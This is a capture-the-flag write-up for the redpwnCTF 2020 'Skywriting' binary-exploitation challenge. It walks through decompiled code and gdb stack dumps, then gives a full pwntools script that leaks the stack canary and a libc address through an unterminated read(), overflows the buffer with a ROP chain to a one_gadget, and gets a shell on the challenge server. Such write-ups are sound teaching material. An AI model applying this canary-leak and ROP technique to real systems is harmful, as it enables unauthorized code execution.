---
title: "redpwnCTF 2020: Skywriting (Pwn)"
layout: post
date: 2020-06-26
tags:
- CTF
- writeup
- redpwnCTF
- 2020
- Pwn
comments: true
---

> It's pretty intuitive once you [disambiguate some homoglyphs](https://medium.com/@TCS_20XX/pactf-2018-writeup-skywriting-a5f857463c07), I don't get why nobody solved it...
>
> `nc 2020.redpwnc.tf 31034`
>
> [skywriting.tar.gz](/files/skywriting.tar.gz)

Let's start off by running checksec on the binary.

```
vagrant@ctf:/vagrant/challenges/redpwn20/skywriting/bin$ checksec skywriting
[*] '/vagrant/challenges/redpwn20/skywriting/bin/skywriting'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Okay, looks like we're dealing with a x64 binary with most security features enabled. Let's run it to see what it does.

```
vagrant@ctf:/vagrant/challenges/redpwn20/skywriting/bin$ ./skywriting
Hello there, do you want to write on the sky?
a
:(, take this shell instead
sh: 1: /bin/zsh: not found
```

The hell? Are they just outright giving us a shell?

```
vagrant@ctf:/vagrant/challenges/redpwn20/skywriting/bin$ nc 2020.redpwnc.tf 31034
Hello there, do you want to write on the sky?
a
:(, take this shell instead
```

What a troll, they don't even have `zsh` installed on their server. Oh well, was worth a shot though. Let's start off with some static analysis.

```c
undefined8 FUN_00100995(void)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  int local_9c;
  char local_98 [136];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  _DAT_00302060 = "use the right statistical randomness tests";
  _DAT_00302068 = "disambiguate some homoglyphs";
  _DAT_00302070 = "recognize the poem";
  _DAT_00302078 = "interpret them as Google Drive IDs";
  _DAT_00302080 = "recognize the logical clues";
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Hello there, do you want to write on the sky? ");
  __isoc99_scanf(&DAT_00100cc7,&local_9c);
  if (local_9c == 1) {
    puts("Yay!");
    printf("Is the answer intuitive yet? Give it your best shot: ");
    read(0,local_98,0x200);
    while( true ) {
      iVar1 = strcmp("notflag{a_cloud_is_just_someone_elses_computer}\n",local_98);
      if (iVar1 == 0) break;
      printf("%s??\n",local_98);
      uVar2 = FUN_0010093a();
      printf("I can\'t believe you haven\'t gotten it yet. You just need to %s and its trivial\n",
             uVar2);
      printf("Try again, give it another shot: ");
      read(0,local_98,0x200);
    }
    puts("Good job! You did it!");
  }
  else {
    puts(":(, take this shell instead");
    system("/bin/zsh");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Interesting. The program asks us if we want to _write on the sky_ and if we respond with `1`, it'll keep repeating our input back to us indefinitely until we key in `notflag{a_cloud_is_just_someone_elses_computer}`. If we look closely we'd notice __two fatal flaws__ in this program, involving the `read()` function:

1. It's letting us key in way more input (0x200 bytes) than the destination buffer can store.
2. `read()` doesn't append a null byte at the end of the input.

The first flaw allows us to perform a buffer overflow exploit, and the second flaw would allow us to leak data from the stack as `printf` would continue printing until it detects a null byte. Another thing to note is that we can continue to leak as much data as we want and just key in `notflag{a_cloud_is_just_someone_elses_computer}` when we want to return from the function, ergo letting us trigger our ROP chain.

Since this binary has both `PIE` and a stack `canary`, we would need to leak an address with a known offset (to allow us to caculate other function addresses) and the canary value. Let's open the binary in gdb and see what we've got on the stack that we can work with.

```
pwndbg> bt
#0  0x00007ffff7af4081 in __GI___libc_read (fd=0, buf=0x7fffffffdae0, nbytes=512) at ../sysdeps/unix/sysv/linux/read.c:27
#1  0x0000555555554b0c in ?? ()
#2  0x00007ffff7a05b97 in __libc_start_main (main=0x555555554995, argc=1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) at ../csu/libc-start.c:310
#3  0x000055555555485a in ?? ()

pwndbg> stack 25
00:0000│ rsp  0x7fffffffdac8 —▸ 0x555555554b0c ◂— lea    rax, [rbp - 0x90]
01:0008│      0x7fffffffdad0 ◂— 0xffffffff
02:0010│      0x7fffffffdad8 ◂— 0x100000000
03:0018│ rsi  0x7fffffffdae0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
... ↓
07:0038│      0x7fffffffdb00 ◂— 0xa4141414141 /* 'AAAAA\n' */
08:0040│      0x7fffffffdb08 ◂— 0x756e6547 /* 'Genu' */
09:0048│      0x7fffffffdb10 ◂— 9 /* '\t' */
0a:0050│      0x7fffffffdb18 —▸ 0x7ffff7dd7660 (dl_main) ◂— push   rbp
0b:0058│      0x7fffffffdb20 —▸ 0x7fffffffdb88 —▸ 0x7fffffffdc58 —▸ 0x7fffffffdfb7 ◂— '/vagrant/challenges/redpwn20/skywriting/bin/skywriting'
0c:0060│      0x7fffffffdb28 ◂— 0xf0b5ff
0d:0068│      0x7fffffffdb30 ◂— 0x1
0e:0070│      0x7fffffffdb38 —▸ 0x555555554bbd ◂— add    rbx, 1
0f:0078│      0x7fffffffdb40 —▸ 0x7ffff7de59a0 (_dl_fini) ◂— push   rbp
10:0080│      0x7fffffffdb48 ◂— 0x0
11:0088│      0x7fffffffdb50 —▸ 0x555555554b70 ◂— push   r15
12:0090│      0x7fffffffdb58 —▸ 0x555555554830 ◂— xor    ebp, ebp
13:0098│      0x7fffffffdb60 —▸ 0x7fffffffdc50 ◂— 0x1
14:00a0│      0x7fffffffdb68 ◂— 0xf7cf81bc93909400
15:00a8│ rbp  0x7fffffffdb70 —▸ 0x555555554b70 ◂— push   r15
16:00b0│      0x7fffffffdb78 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
17:00b8│      0x7fffffffdb80 ◂— 0x1
18:00c0│      0x7fffffffdb88 —▸ 0x7fffffffdc58 —▸ 0x7fffffffdfb7 ◂— '/vagrant/challenges/redpwn20/skywriting/bin/skywriting'

pwndbg> canary
AT_RANDOM = 0x7fffffffdf99 # points to (not masked) global canary value
Canary    = 0xf7cf81bc93909400
Found valid canaries on the stacks:
00:0000│   0x7fffffffd438 ◂— 0xf7cf81bc93909400
00:0000│   0x7fffffffd9a8 ◂— 0xf7cf81bc93909400
00:0000│   0x7fffffffda08 ◂— 0xf7cf81bc93909400
00:0000│   0x7fffffffdb68 ◂— 0xf7cf81bc93909400
```

Okay nice, let's use `__libc_start_main + 231` as an offset to resolve the rest of our addresses. So here's the game plan:

1. Leak stack canary
    - `<'A' * Padding to canary>`
2. Leak `__libc_start_main + 231`
    - `<'A' *  Padding to __libc_start_main + 231>`
3. Pwn
    - `<notflag{a_cloud_is_just_someone_elses_computer}\n\x00><'A' * Padding to canary><canary><Padding to RIP><one_gadget>`

Now let's write a script to solve it.

```python
#! /usr/bin/python3

from pwn import *

HOST = '2020.redpwnc.tf'
PORT = 31034
BINARY = './skywriting'

elf = context.binary = ELF(BINARY)
libc = ELF('./libc.so.6')  # glibc-2.27 (Ubuntu 18.04 default libc, based on provided Dockerfile)

libc.symbols['one_gadget'] = 0x4f322

'''
We pad until we are exactly just before the canary so that the null byte in the least significant byte
of the canary would be overwritten with a newline character. So that the null byte won't stop us from
leaking the full canary via printf
'''
CANARY_PADDING = 136
'''
We pad until we are one byte before __libc_start_main + 231 so that the newline won't overwrite any of
it's bytes.
'''
LIBC_START_MAIN_231_PADDING = CANARY_PADDING + 15
RIP_PADDING = CANARY_PADDING + 8 + 8

TRIGGER_RET = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'

splash()

r = remote(HOST, PORT)

with log.progress('Stage 1: Leak canary'):
    r.recvuntil('Hello there, do you want to write on the sky? \n')
    r.sendline('1')

    r.recvuntil('Is the answer intuitive yet? Give it your best shot: ')

    PAYLOAD = flat(length = CANARY_PADDING)
    r.sendline(PAYLOAD)

    r.recvline()
    canary = u64(b'\x00' + r.recvn(7)) # Fix width for canary

    r.success(f'Leaked canary: {hex(canary)}')

with log.progress('Stage 2: Leak (__libc_start_main + 231)'):
    r.recvuntil('Try again, give it another shot: ')

    PAYLOAD = flat(length = LIBC_START_MAIN_231_PADDING)
    r.sendline(PAYLOAD)

    r.recvline()
    libc_start_main_231 = u64(r.recvn(6) + b'\x00\x00') # Fix width for __libc_start_main + 231
    r.success(f'Leaked (__libc_start_main + 231): {hex(libc_start_main_231)}')

    libc.address = libc_start_main_231 - (libc.symbols['__libc_start_main'] + 231)
    r.success(f'Calculated libc base: {hex(libc.address)}')

with log.progress('Stage 3: Pwn'):
    rop = ROP([elf, libc])
    rop.one_gadget()

    r.recvuntil('Try again, give it another shot: ')
    r.sendline(flat({ 0: TRIGGER_RET, CANARY_PADDING: p64(canary), RIP_PADDING: rop.chain() }))

    r.interactive()

r.close()
```

Let's see it in action!

<script id="asciicast-343220" src="https://asciinema.org/a/343220.js" async></script>

Flag: `flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}`
